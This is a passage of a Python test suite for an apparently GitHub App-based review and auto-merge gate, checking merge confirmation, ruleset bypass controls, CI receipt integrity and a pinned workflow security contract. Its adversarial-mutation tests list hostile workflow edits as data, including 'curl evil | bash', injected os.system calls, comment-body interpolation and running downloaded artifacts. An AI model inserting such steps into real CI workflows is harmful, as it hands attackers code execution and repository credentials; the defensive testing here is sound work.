        cases=('response_actor','response_actor_null','readback_actor','readback_actor_null','readback_method','readback_head','missing_readback')
        for defect in cases:
            read,write=self.fake_apis();original=read.request;writes=[]
            def mutate(path,method,data):
                writes.append((path,method,data))
                if path=='/graphql':
                    actor='foreign[bot]' if defect=='response_actor' else gate.APP_SLUG+'[bot]'
                    return {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'SQUASH','enabledBy':None if defect=='response_actor_null' else {'login':actor}}}}}}
                return {'id':77,'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}
            def observed(path):
                pr=original(path)
                if path.endswith('/pulls/1') and len(writes)==2:
                    armed={'merge_method':'squash','enabled_by':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
                    if defect=='readback_actor':armed['enabled_by']['id']=gate.OWNER_ID
                    if defect=='readback_actor_null':armed['enabled_by']=None
                    if defect=='readback_method':armed['merge_method']='merge'
                    if defect=='readback_head':pr['head']['sha']='f'*40
                    pr['auto_merge']=None if defect=='missing_readback' else armed
                return pr
            read.request=observed;write.request=mutate
            read.pages=lambda *args:[{'id':77,'state':'APPROVED','commit_id':'a'*40,
                                      'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}] if writes else []
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'native auto-merge not confirmed'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),2,'ambiguous result must not trigger another write')

    def test_head_mismatch_and_graphql_errors_never_report_armed_or_retry(self):
        proof=self.proof()
        approved={'id':77,'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}
        for response in ({'errors':[{'message':'head changed','type':'UNPROCESSABLE'}]},
                         {'errors':[{'message':'other failure'}],'data':{'enablePullRequestAutoMerge':None}},
                         {}, {'data':None}, {'data':{'enablePullRequestAutoMerge':{'pullRequest':None}}},
                         {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'MERGE'}}}}}):
            with self.subTest(response=response):
                read,write=self.fake_apis()
                def mutate(path,method,data):
                    if path=='/graphql':
                        # Simulate GitHub observing a head race after our last read.
                        self.assertEqual(data['variables']['input']['expectedHeadOid'],proof['tuple']['head_sha'])
                        return response
                    return approved
                with patch.object(gate,'snapshot',return_value=proof),patch.object(write,'request',side_effect=mutate) as request:
                    with self.assertRaisesRegex(gate.Rejected,'native auto-merge not confirmed'):
                        gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                    self.assertEqual(request.call_count,2)
    def clean_apis(self):
        read,write=self.fake_apis();original=read.request;writes=[]
        def request(path):
            merged=len(writes)==2
            if path.endswith('/pulls/1'):
                pr=self.live_pr('clean')
                if merged:
                    pr.update(state='closed',merged=True,merge_commit_sha='d'*40,
                              merged_by={'id':gate.BOT_ID,'login':gate.APP_SLUG+'[bot]'})
                return pr
            if path.endswith('/git/ref/heads/main'):
                return {'object':{'sha':('d' if merged else 'b')*40}}
            if '/git/commits/' in path:
                return {'parents':[{'sha':'b'*40}],'tree':{'sha':'e'*40}}
            return original(path)
        def mutate(path,method,data):
            writes.append((path,method,data))
            if path=='/graphql':
                return {'data':{'mergePullRequest':{'pullRequest':{'id':'PR_node','merged':True,'mergeCommit':{'oid':'d'*40}}}}}
            return {'id':77,'state':'APPROVED','commit_id':'a'*40,'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        read.request=request;write.request=mutate
        read.pages=lambda *args:[{'id':77,'state':'APPROVED','commit_id':'a'*40,
                                 'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}] if writes else []
        return read,write,writes
    def test_clean_native_squash_verifies_app_actor_parent_tree_and_main(self):
        read,write,writes=self.clean_apis()
        with patch.object(gate,'snapshot',return_value=self.proof()) as snapshot:
            result=gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
        self.assertEqual(snapshot.call_count,3)
        self.assertEqual(result,{'status':'merged','head_sha':'a'*40,'merged':True,'merge_sha':'d'*40,'base_sha':'b'*40})
        self.assertEqual(len(writes),2)
        self.assertEqual(writes[0][2]['event'],'APPROVE')
        self.assertIn('mergePullRequest(input:$input)',writes[1][2]['query'])
        self.assertNotIn('enablePullRequestAutoMerge',writes[1][2]['query'])
        self.assertEqual(writes[1][2]['variables']['input'],{'pullRequestId':'PR_node','expectedHeadOid':'a'*40,'mergeMethod':'SQUASH'})
    def test_clean_error_never_falls_back_to_arm_or_retries(self):
        for response in ({'errors':[{'type':'UNPROCESSABLE','message':'private arbitrary text'}]}, {},
                         {'data':{'mergePullRequest':{'pullRequest':None}}}):
            read,write,writes=self.clean_apis();original=write.request
            def mutate(path,method,data):
                if path=='/graphql':
                    writes.append((path,method,data));return response
                return original(path,method,data)
            write.request=mutate
            with patch.object(gate,'snapshot',return_value=self.proof()):
                with self.assertRaises(gate.Rejected) as error:
                    gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertNotIn('private arbitrary text',str(error.exception))
            self.assertEqual(len(writes),2)
    def test_changed_unknown_or_nonready_native_state_never_merges(self):
        mutations=[lambda p,s=s:p.update(mergeable_state=s) for s in ('behind','unstable','dirty','unknown',None)]
        mutations += [lambda p:p.update(mergeable=None),lambda p:p.update(merged=True),lambda p:p.update(draft=True),
                      lambda p:p['head'].update(sha='f'*40),lambda p:p['base'].update(sha='f'*40),
                      lambda p:p['base']['repo'].update(id=99)]
        for mutation in mutations:
            read,write,writes=self.clean_apis();original=read.request
            def request(path):
                value=original(path)
                if path.endswith('/pulls/1'):mutation(value)
                return value
            read.request=request
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'native delivery state drift'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),1)
    def test_merge_confirmation_cannot_claim_unverified_or_foreign_delivery(self):
        for defect in ('open','wrong_actor','wrong_head','wrong_parent','wrong_tree','wrong_main'):
            read,write,writes=self.clean_apis();original=read.request
            def request(path):
                value=original(path)
                if len(writes)==2:
                    if path.endswith('/pulls/1'):
                        if defect=='open':value['merged']=False
                        if defect=='wrong_actor':value['merged_by']['id']=gate.OWNER_ID
                        if defect=='wrong_head':value['head']['sha']='f'*40
                    if path.endswith('/git/commits/'+'d'*40):
                        if defect=='wrong_parent':value['parents']=[{'sha':'f'*40}]
                        if defect=='wrong_tree':value['tree']['sha']='f'*40
                    if defect=='wrong_main':
                        if path.endswith('/git/ref/heads/main'):value['object']['sha']='f'*40
                        if '/compare/' in path:value={'merge_base_commit':{'sha':'b'*40}}
                return value
            read.request=request
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'read-only reconciliation'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),2)
    def test_base_moves_after_final_snapshot_prevents_delivery_write(self):
        read,write,writes=self.clean_apis();original=read.request
        read.request=lambda path: {'object':{'sha':'f'*40}} if path.endswith('/git/ref/heads/main') else original(path)
        with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'native delivery state drift'):
            gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
        self.assertEqual(len(writes),1)
    def test_visible_owner_exception_cannot_disappear_or_duplicate(self):
        for history_only in (False,True):
            repo,rules,sets=APIAndControlsTests().controls()
            if history_only:
                rules += [dict(type=name,ruleset_id=2) for name in ('deletion','non_fast_forward')]
                sets += [dict(id=2,enforcement='active',rules=[{'type':name} for name in ('deletion','non_fast_forward')],
                              bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='always')])]
            target=sets[-1]
            for actors in ([],target['bypass_actors']*2,{},None):
                with self.subTest(history_only=history_only,actors=actors):
                    changed=copy.deepcopy(sets);changed[-1]['bypass_actors']=actors
                    with self.assertRaises(gate.Rejected):
                        gate.validate_controls(repo,rules,changed)
            del target['bypass_actors']
            gate.validate_controls(repo,rules,sets)
    def test_other_app_or_multirepo_token_cannot_write(self):
        read,write=self.fake_apis();write.pages=lambda *args:[{'id':gate.REPOSITORY_ID},{'id':99}]
        with patch.object(write,'request') as request:
            with self.assertRaises(gate.Rejected):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()





# This is a security contract, not a workflow snapshot. Names, descriptions,
# comments, JSON formatting, and shell/Python whitespace are not pinned. The
# privileged execution surface, credential wiring and admission guards are closed.
class GitAncestryTests(unittest.TestCase):
    def test_deepens_until_common_ancestor_and_stops(self):
        calls=[];base='b'*40;head='a'*40
        def command(*args,**kwargs):
            calls.append((args,kwargs))
            if args[0]=='merge-base':return None if len(calls)==2 else (base+'\n').encode()
        self.assertEqual(gate.bounded_merge_base(command,base,head),base)
        self.assertEqual([args[3] for args,_ in calls if args[0]=='fetch'],['--depth=256','--depth=512'])
        self.assertTrue(all(kwargs=={'no_common_base_ok':True} for args,kwargs in calls if args[0]=='merge-base'))
    def test_missing_ancestry_is_bounded_and_other_errors_do_not_retry(self):
        calls=[]
        def absent(*args,**kwargs):calls.append(args);return None
        with self.assertRaisesRegex(gate.Rejected,'bounded review route'):gate.bounded_merge_base(absent,'b'*40,'a'*40)
        self.assertEqual(len(calls),10)
        self.assertEqual(calls[-2][3],'--depth=4096')
        calls=[]
        def broken(*args,**kwargs):calls.append(args);raise gate.Rejected('transport failure')
        with self.assertRaisesRegex(gate.Rejected,'transport failure'):gate.bounded_merge_base(broken,'b'*40,'a'*40)
        self.assertEqual(len(calls),1)

class WorkflowContractTests(unittest.TestCase):
    CHECKOUT='actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
    TOKEN='actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510'
    RECEIPT="github.event_name != 'workflow_dispatch' || inputs.mode == 'receipt'"
    QUALIFY="github.event_name == 'workflow_dispatch' && (inputs.mode == 'app' || inputs.mode == 'app-current')"
    WRITE="github.event_name != 'workflow_dispatch' && vars.REVIEWER_APP_ENABLED == 'true'"
    ADMIT="""github.repository == 'KleinPerkins/shadow-sync' &&
      ((github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main') ||
       (github.event_name == 'issue_comment' && github.event.issue.pull_request &&
        github.event.sender.id == 49759187 && startsWith(github.event.comment.body, '<!-- g1-review-receipt:v1 -->')) ||
       (github.event_name == 'workflow_run' && github.event.workflow_run.event == 'pull_request' &&
        github.event.workflow_run.conclusion == 'success' &&
        github.event.workflow_run.head_repository.id == 1442961455))"""
    RESOLVE="""import json, os
event = json.load(open(os.environ['GITHUB_EVENT_PATH']))
kind = os.environ['GITHUB_EVENT_NAME']
if kind == 'issue_comment':
    number = event['issue']['number']
elif kind == 'workflow_run':
    prs = event['workflow_run']['pull_requests']
    if len(prs) != 1:
        raise SystemExit('Exactly one PR binding required; use read-only qualification for diagnosis')
    number = prs[0]['number']
else:
    number = int(event['inputs']['pr'])
if type(number) is not int or not 0 < number < 1000000000:
    raise SystemExit('Invalid PR number')
with open(os.environ['GITHUB_OUTPUT'], 'a') as output:
    output.write(f'pr={number}\\n')
"""
    def load(self,text=None):
        def unique(pairs):
            result={}
            for key,value in pairs:
                self.assertNotIn(key,result,'duplicate workflow key')
                result[key]=value
            return result
        return json.loads(text if text is not None else (gate.ROOT/'.github/workflows/reviewer-app.yml').read_text(),object_pairs_hook=unique)
    def condition(self,actual,expected):
        # Ignore expression layout while retaining grouping, literals, all guards
        # and the AND/OR relationship. This rejects `|| true` and comments/injections.
        self.assertEqual(' '.join(actual.split()),' '.join(expected.split()))
    def contract(self,w):
        self.assertIsInstance(w,dict)
        self.assertEqual(set(w),{'name','on','permissions','concurrency','jobs'})
        self.assertEqual(set(w['on']),{'issue_comment','workflow_run','workflow_dispatch'})
        self.assertEqual(w['on']['issue_comment'],{'types':['created']})
        self.assertEqual(w['on']['workflow_run'],{'workflows':['CI'],'types':['completed']})
        dispatch=w['on']['workflow_dispatch']
        self.assertEqual(set(dispatch),{'inputs'})
        self.assertEqual(set(dispatch['inputs']),{'mode','pr'})
        mode=dispatch['inputs']['mode'];pr=dispatch['inputs']['pr']
        self.assertEqual({k:v for k,v in mode.items() if k!='description'},
                         {'type':'choice','options':['receipt','app','app-current'],'default':'receipt'})
        self.assertEqual({k:v for k,v in pr.items() if k!='description'},{'type':'string','required':False})
        self.assertEqual(w['permissions'],{'contents':'read','actions':'read','checks':'read','pull-requests':'read'})
        self.assertEqual(w['concurrency'],{'group':'g1-reviewer-app','cancel-in-progress':False})
        self.assertEqual(set(w['jobs']),{'admit'})
        job=w['jobs']['admit']
        self.assertEqual(set(job),{'if','runs-on','timeout-minutes','steps'})
        self.assertEqual(job['runs-on'],'ubuntu-24.04')
        self.assertIs(type(job['timeout-minutes']),int)
        self.assertTrue(0<job['timeout-minutes']<=15)
        self.condition(job['if'],self.ADMIT)
        steps=job['steps'];self.assertEqual(len(steps),7)
        checkout,target,receipt,qual_token,qualify,app_token,write=steps
        # No extra uses/run/env/defaults/container/services are accepted. Thus no
        # local action, artifact download, candidate checkout or new shell can run.
        self.assertEqual(set(checkout),{'uses','with'})
        self.assertEqual(checkout['uses'],self.CHECKOUT)
        self.assertEqual(checkout['with'],{'ref':'${{ github.workflow_sha }}','persist-credentials':False,
            'sparse-checkout':'scripts/reviewer_app.py\nscripts/ci-shards.py\nscripts/verify-ci-results.py\n.github/review-enrollments.json\n','sparse-checkout-cone-mode':False})
        self.assertEqual(set(target)-{'name'},{'id','if','run'})
        self.assertEqual(target['id'],'target');self.condition(target['if'],self.RECEIPT)
        resolver=target['run'].splitlines()
        self.assertEqual(resolver[0],"python3 -I -B - <<'PY'");self.assertEqual(resolver[-1],'PY')
        self.assertNotIn('${{',target['run'])
        self.assertEqual(ast.dump(ast.parse('\n'.join(resolver[1:-1]))),ast.dump(ast.parse(self.RESOLVE)))
        ci_env={'CI_READ_TOKEN':'${{ github.token }}','TRUSTED_WORKFLOW_SHA':'${{ github.workflow_sha }}'}
        target_env={'TARGET_PR':'${{ steps.target.outputs.pr }}'}
        def execute(step,guard,args,env):
            self.assertEqual(set(step)-{'name'},{'if','env','run'})
            self.condition(step['if'],guard)
            self.assertEqual(step['env'],env)
            self.assertEqual(shlex.split(step['run']),['python3','-I','-B','scripts/reviewer_app.py']+args)
        execute(receipt,self.RECEIPT,['--pr','$TARGET_PR'],dict(ci_env,**target_env))
        def mint(step,identity,guard,permission):
            self.assertEqual(set(step)-{'name'},{'if','id','uses','with'})
            self.assertEqual(step['id'],identity);self.condition(step['if'],guard)
            self.assertEqual(step['uses'],self.TOKEN)
            self.assertEqual(step['with'],{'app-id':'4217367','private-key':'${{ secrets.AUTOMERGE_APP_PRIVATE_KEY }}',
                'owner':'KleinPerkins','repositories':'shadow-sync','permission-contents':permission,
                'permission-pull-requests':permission,'skip-token-revoke':False})
        mint(qual_token,'qualification',self.QUALIFY+" && vars.REVIEWER_APP_QUALIFY == 'true' && vars.REVIEWER_APP_ENABLED != 'true'",'read')
        mint(app_token,'app',self.WRITE,'write')
        def app_env(identity):
            return {key:'${{ steps.'+identity+'.outputs.'+output+' }}' for key,output in
                    (('APP_TOKEN','token'),('APP_SLUG','app-slug'),('APP_INSTALLATION_ID','installation-id'))}
        flags={'REVIEWER_APP_ENABLED':'${{ vars.REVIEWER_APP_ENABLED }}'}
        execute(qualify,self.QUALIFY,['--qualify-app','--qualification-stage','$QUALIFICATION_STAGE'],dict(ci_env,**app_env('qualification'),**flags,
            REVIEWER_APP_QUALIFY='${{ vars.REVIEWER_APP_QUALIFY }}',
            QUALIFICATION_STAGE="${{ inputs.mode == 'app-current' && 'current' || 'bootstrap' }}"))
        execute(write,self.WRITE,['--pr','$TARGET_PR','--write'],dict(ci_env,**app_env('app'),**flags,**target_env))
    def test_trusted_workflow_security_contract(self):
        self.contract(self.load())
    def test_invalid_scalar_and_duplicate_key_cannot_replace_workflow(self):
        for raw in ('this is invalid Actions YAML\n','"scalar"','[]','null','{"jobs":{},"jobs":{}}'):
            with self.subTest(raw=raw),self.assertRaises((AssertionError,ValueError)):
                self.contract(self.load(raw))
    def test_workflow_adversarial_mutations_reject(self):
        cases=[
            ('write-all token',lambda w:w.update(permissions='write-all')),
            ('job permissions',lambda w:w['jobs']['admit'].update(permissions={'contents':'write'})),
            ('candidate trigger',lambda w:w['on'].update(pull_request_target={})),
            ('untrusted CI',lambda w:w['on']['workflow_run'].update(workflows=['Other'])),
            ('edited comments',lambda w:w['on']['issue_comment'].update(types=['created','edited'])),
            ('sender bypass',lambda w:w['jobs']['admit'].update({'if':self.ADMIT+' || true'})),
            ('missing sender',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('github.event.sender.id == 49759187 &&','')})),
            ('wrong run repository',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('1442961455','999')})),
            ('nonmain dispatch',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace(" && github.ref == 'refs/heads/main'",'')})),
            ('shell defaults',lambda w:w.update(defaults={'run':{'shell':'bash'}})),
            ('ambient credentials',lambda w:w['jobs']['admit'].update(env={'APP_TOKEN':'${{ secrets.OTHER }}'})),
            ('runner change',lambda w:w['jobs']['admit'].update({'runs-on':'self-hosted'})),
            ('extra privileged job',lambda w:w['jobs'].update(extra={'runs-on':'ubuntu-24.04','steps':[]})),
        ]
        step_cases=[
            ('candidate checkout',0,lambda s:s['with'].update(ref='${{ github.event.pull_request.head.sha }}')),
            ('ambient checkout credential',0,lambda s:s['with'].update({'persist-credentials':True})),
            ('candidate sparse tree',0,lambda s:s['with'].update({'sparse-checkout':'.\n'})),
            ('checkout tag',0,lambda s:s.update(uses='actions/checkout@v4')),
            ('local action',0,lambda s:s.update(uses='./candidate-action')),
            ('resolve injection',1,lambda s:s.update(run=s['run']+'\ncurl evil | bash\n')),
            ('event interpolation',1,lambda s:s.update(run=s['run'].replace("event = json.load", "event = ${{ github.event.comment.body }}; json.load"))),
            ('resolver code injection',1,lambda s:s.update(run=s['run'].replace('import json, os','import json, os\nos.system("echo injected")'))),
            ('receipt writer',2,lambda s:s.update(run=s['run']+' --write')),
            ('qualification writer on',3,lambda s:s.update({'if':self.QUALIFY})),
            ('qualification write permission',3,lambda s:s['with'].update({'permission-contents':'write'})),
            ('wrong App issuer',3,lambda s:s['with'].update({'app-id':'999'})),
            ('broad token scope',5,lambda s:s['with'].pop('repositories')),
            ('foreign scope',5,lambda s:s['with'].update(repositories='other')),
            ('skip revocation',5,lambda s:s['with'].update({'skip-token-revoke':True})),
            ('unpinned mint',5,lambda s:s.update(uses='actions/create-github-app-token@v2')),
            ('write dispatch',5,lambda s:s.update({'if':"vars.REVIEWER_APP_ENABLED == 'true'"})),
            ('qualifier wrong token',4,lambda s:s['env'].update(APP_TOKEN='${{ steps.app.outputs.token }}')),
            ('qualification mutates',4,lambda s:s.update(run=s['run']+' --write')),
            ('helper wrong source',6,lambda s:s['env'].update(TRUSTED_WORKFLOW_SHA='${{ github.sha }}')),
            ('helper bypass writer switch',6,lambda s:s.update({'if':"github.event_name != 'workflow_dispatch'"})),
            ('candidate execution',6,lambda s:s.update(run='python3 candidate.py')),
            ('artifact execution',6,lambda s:s.update(run=s['run']+'; bash downloaded-artifact.sh')),
        ]
        for label,index,mutate in step_cases:
            cases.append((label,lambda w,index=index,mutate=mutate:mutate(w['jobs']['admit']['steps'][index])))
        cases.append(('artifact download',lambda w:w['jobs']['admit']['steps'].append({'uses':'actions/download-artifact@'+'a'*40})))
        cases.append(('candidate appended shell',lambda w:w['jobs']['admit']['steps'].append({'run':'bash candidate.sh'})))
        for label,mutate in cases:
            with self.subTest(boundary=label):
                workflow=self.load();mutate(workflow)
                with self.assertRaises((AssertionError,SyntaxError,ValueError)):
                    self.contract(workflow)
    def test_nonsecurity_presentation_changes_are_allowed(self):
        workflow=self.load();workflow['name']='Renamed gate'
        workflow['jobs']['admit']['steps'][2]['name']='Receipt diagnosis'
        workflow['on']['workflow_dispatch']['inputs']['mode']['description']='Read-only mode'
        target=workflow['jobs']['admit']['steps'][1]
        target['run']=target['run'].replace('import json, os','import json, os  # formatting is not policy')
        workflow['jobs']['admit']['if']=self.ADMIT.replace(' &&','   &&')
        self.contract(self.load(json.dumps(workflow,indent=4)))

class ShadowCITests(unittest.TestCase):
    def setUp(self):
        guard = patch.object(gate, 'git_source_at', return_value='d'*64)
        self.source_digest = guard.start()
        self.addCleanup(guard.stop)

    def fixture(self, transition=True, main=False):
        ci = gate.ci_module()
        raw = (gate.ROOT / 'config/ci-suites.json').read_bytes()
        before = None if transition else raw
        head, base, merge = 'a'*40, 'b'*40, 'c'*40
        pr = None if main else {'number': 1, 'head': {'sha': head}, 'base': {'sha': base}}
        run = dict(id=10, run_attempt=2, status='completed', conclusion='success',
            event='push' if main else 'pull_request', head_sha=head,
            repository={'id':gate.REPOSITORY_ID}, head_repository={'id':gate.REPOSITORY_ID},
            pull_requests=[] if main else [{'number':1,'head':{'sha':head},'base':{'sha':base}}], check_suite_id=50)
        plan=ci.make_plan(raw,before,revision=head,source_sha256='d'*64,run_id='10',run_attempt='2')
        ref='refs/heads/main' if main else 'refs/pull/1/merge'
        identity=dict(repository=gate.REPOSITORY,repository_id=str(gate.REPOSITORY_ID),event=run['event'],
            revision=head,workflow_sha=head if main else merge,run_id='10',run_attempt='2',ref=ref,
            head_sha='' if main else head,base_sha='' if main else base,
            workflow_ref=gate.REPOSITORY+'/.github/workflows/ci.yml@'+ref,workflow='CI')
        suites=ci.registration(raw)['coverage']['suites']
        result=dict(schema='shadow-sync-ci-shards-required/v1',status='complete',revision=head,run_id='10',run_attempt='2',
            mode=plan['mode'],plan_sha256=ci.digest(ci.encode(plan)),units=len(plan['units']),unique_suites=len(suites),
            unique_cases=sum(len(row['cases']) for row in suites.values()),seconds_by_unit={row['id']:1.0 for row in plan['units']})
        receipt=dict(schema='shadow-sync-ci-aggregate/v1',identity=identity,plan=plan,result=result)
        names=['plan',*[row['id'] for row in plan['units']],'ci-required']
        jobs=[dict(id=i,name=name,status='completed',conclusion='success',run_id=10,
            check_run_url='https://api.github.com/check-runs/'+str(i)) for i,name in enumerate(names,1)]
        checks={str(row['id']):dict(name=row['name'],app={'id':15368},status='completed',conclusion='success',
            head_sha=head,check_suite={'id':50}) for row in jobs}
        oid=gate.hashlib.sha1(b'blob '+str(len(raw)).encode()+b'\0'+raw).hexdigest()
        def request(path):
            if path.endswith('ci.yml'):return {'id':5,'path':'.github/workflows/ci.yml','state':'active'}
            if '/git/trees/' in path:
                absent=transition and base in path
                return {'truncated':False,'tree':[] if absent else [{'path':'config/ci-suites.json','mode':'100644','type':'blob','sha':oid}]}
            if '/git/blobs/' in path:return {'sha':oid,'encoding':'base64','size':len(raw),'content':gate.base64.b64encode(raw).decode()}
            if '/git/commits/' in path:return {'sha':head,'parents':[{'sha':base}]}
            return checks[path.rsplit('/',1)[-1]]
        api=gate.API('fixture');api.request=request
        api.pages=lambda path,key:([run] if key=='workflow_runs' else jobs)
        api.job_log=lambda job:'2026-11-17T12:00:00Z SHADOW_SYNC_CI_AGGREGATE_V1 '+json.dumps(receipt)
        return api,pr,head if main else merge,run,jobs,checks,receipt

    def test_all_routine_and_transition_units_with_exact_attempt_pass(self):
        for transition in (False,True):
            api,pr,revision,*_=self.fixture(transition)
            self.assertEqual(gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,revision),(10,2))

    def test_self_consistent_wrong_source_digest_refuses(self):
        api,pr,revision,run,jobs,checks,receipt=self.fixture()
        receipt['plan']['source_sha256']='f'*64
        receipt['result']['plan_sha256']=gate.ci_module().digest(gate.ci_module().encode(receipt['plan']))
        with self.assertRaisesRegex(gate.Rejected, 'aggregate source digest mismatch'):
            gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,revision)
        self.source_digest.assert_called_with(pr['head']['sha'],api.token)

    def test_main_qualification_uses_actual_push_parent_transition(self):
        api,pr,revision,run,*_=self.fixture(main=True)
        gate.validate_ci_jobs(api,'/repos/'+gate.REPOSITORY,pr,revision,run)

    def test_missing_skipped_foreign_stale_and_forged_units_refuse(self):
        mutations=[lambda run,jobs,checks,r:jobs.pop(1),
            lambda run,jobs,checks,r:jobs[1].update(conclusion='skipped'),
            lambda run,jobs,checks,r:checks['2']['app'].update(id=999),
            lambda run,jobs,checks,r:run['pull_requests'][0]['base'].update(sha='f'*40),
            lambda run,jobs,checks,r:run.update(run_attempt=3),
            lambda run,jobs,checks,r:r['result'].update(unique_cases=1),
            lambda run,jobs,checks,r:r['result']['seconds_by_unit'].update(unregistered=1),
            lambda run,jobs,checks,r:r['result']['seconds_by_unit'].update(quality=-1),
            lambda run,jobs,checks,r:r['plan'].update(mode='routine'),
            lambda run,jobs,checks,r:r['identity'].update(workflow_sha='f'*40),
            lambda run,jobs,checks,r:r['identity'].update(repository_id='999'),
            lambda run,jobs,checks,r:r['plan']['units'].pop(),
            lambda run,jobs,checks,r:r['plan'].update(source_sha256='0'*64)]
        for mutate in mutations:
            api,pr,rev,run,jobs,checks,receipt=self.fixture();mutate(run,jobs,checks,receipt)
            with self.subTest(mutation=mutate),self.assertRaises(gate.Rejected):
                gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,rev)

    def test_duplicate_or_malformed_aggregate_refuses(self):
        api,pr,rev,run,*_=self.fixture();valid=api.job_log(1)
        for log in ('missing',valid+'\n'+valid,valid.replace('"run_id": "10"','"run_id": "9"'),
                    'SHADOW_SYNC_CI_AGGREGATE_V1 {"schema":1,"schema":2}'):
            with self.subTest(log=log[:50]),self.assertRaises(gate.Rejected):gate.validate_ci_log(log,pr,rev,run)

    def test_registration_tree_and_blob_integrity_refuse(self):
        api,*_=self.fixture();original=api.request
        for mutate in (lambda row:row.update(truncated=True),lambda row:row['tree'][0].update(mode='120000')):
            def request(path):
                row=original(path)
                if '/git/trees/' in path:mutate(row)
                return row
            api.request=request
            with self.assertRaises(gate.Rejected):gate.registration_at(api,'a'*40)
        api.request=lambda path:dict(original(path),content=gate.base64.b64encode(b'tamper').decode()) if '/git/blobs/' in path else original(path)
        with self.assertRaises(gate.Rejected):gate.registration_at(api,'a'*40)

    def test_host_identity_rejects_event_repository_workflow_and_base_drift(self):
        import os, tempfile
        spec=importlib.util.spec_from_file_location('shadow_ci_host',gate.ROOT/'scripts/ci-host.py')
        host=importlib.util.module_from_spec(spec);spec.loader.exec_module(host)
        event={'pull_request':{'number':1,'head':{'sha':'a'*40},'base':{'sha':'b'*40,'repo':{'id':gate.REPOSITORY_ID}}}}
        with tempfile.TemporaryDirectory() as temporary:
            path=Path(temporary)/'event.json';path.write_text(json.dumps(event))
            env=dict(GITHUB_EVENT_PATH=str(path),GITHUB_EVENT_NAME='pull_request',GITHUB_REPOSITORY=gate.REPOSITORY,
                GITHUB_REPOSITORY_ID=str(gate.REPOSITORY_ID),GITHUB_WORKFLOW='CI',CI_REVISION='a'*40,
                CI_BASE_REVISION='b'*40,GITHUB_SHA='c'*40,GITHUB_WORKFLOW_SHA='c'*40,
                GITHUB_REF='refs/pull/1/merge',GITHUB_WORKFLOW_REF=gate.REPOSITORY+'/.github/workflows/ci.yml@refs/pull/1/merge',
                GITHUB_RUN_ID='10',GITHUB_RUN_ATTEMPT='2')
            with patch.dict(os.environ,env,clear=True):
                self.assertEqual(host.workflow_identity()['revision'],'a'*40)
                for key,value in [('GITHUB_REPOSITORY_ID','1'),('CI_BASE_REVISION','f'*40),
                    ('GITHUB_REF','refs/heads/foreign'),('GITHUB_WORKFLOW_SHA','f'*40),('GITHUB_WORKFLOW','Foreign')]:
                    with self.subTest(key=key),patch.dict(os.environ,{key:value}),self.assertRaises(host.ci.InvalidEvidence):
                        host.workflow_identity()

    def test_exactly_one_effective_review_rule_required(self):
        for count in (0,1,2):
            repo,rules,sets=APIAndControlsTests().controls()
            rules.append(dict(type='pull_request',ruleset_id=1,parameters=dict(rules[1]['parameters'],required_approving_review_count=count)))
            with self.subTest(count=count),self.assertRaises(gate.Rejected):gate.validate_controls(repo,rules,sets)

    def test_predecessor_stays_disabled_and_scope_does_not_release_product(self):
        old=(gate.ROOT/'.github/workflows/app-auto-merge.yml').read_text()
        self.assertEqual(old.count('      false &&'),2)
        policy=json.loads((gate.ROOT/'.github/review-enrollments.json').read_bytes())
        self.assertEqual(policy['repository_id'],1442961455)
        self.assertEqual({row['credential_store'] for row in policy['producers']},{'keyring','file'})
        for row in policy['producers']:
            self.assertEqual(row['capture_adapter_sha256'],gate.digest((gate.ROOT/'scripts/local_review.py').read_bytes()))
            self.assertEqual(row['creation_adapter_sha256'],gate.digest((gate.ROOT/'scripts/create_review_pr.py').read_bytes()))

if __name__=='__main__':unittest.main()


class AppNonBypassTests(unittest.TestCase):
    def fixture(self):
        repo,rules,sets=APIAndControlsTests().controls()
        del sets[0]['bypass_actors']
        sets[0]['current_user_can_bypass']='never'
        app=gate.API('actual-app-token',writable=True)
        def request(path,method='GET',data=None):
            self.assertEqual(method,'GET','caller-specific probes must be reads')
            if path.endswith('/rules/branches/main'):return rules
            if '/rulesets/' in path:return next(row for row in sets if str(row['id'])==path.rsplit('/',1)[1])
            raise AssertionError(path)
